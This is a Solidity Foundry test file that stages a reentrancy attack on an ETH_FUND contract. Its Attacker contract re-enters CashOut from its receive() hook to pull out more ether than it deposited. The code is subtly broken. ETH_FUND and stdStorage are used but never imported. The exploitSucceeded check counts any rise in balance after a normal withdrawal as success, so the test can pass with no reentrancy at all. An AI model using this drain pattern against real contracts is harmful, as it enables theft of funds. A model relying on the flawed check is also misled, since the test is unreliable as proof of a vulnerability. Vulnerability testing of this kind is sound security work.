
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyETH_FUND is Test {
    using stdStorage for StdStorage;

    ETH_FUND public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ETH_FUND(address(0));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_reentrancyInCashOut(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        vm.warp(block.timestamp + 100);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = ETH_FUND(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.CashOut(val);

        if (address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            _victim.CashOut(storedAttackVal);
            attackCallCount++;
        }
    }
}
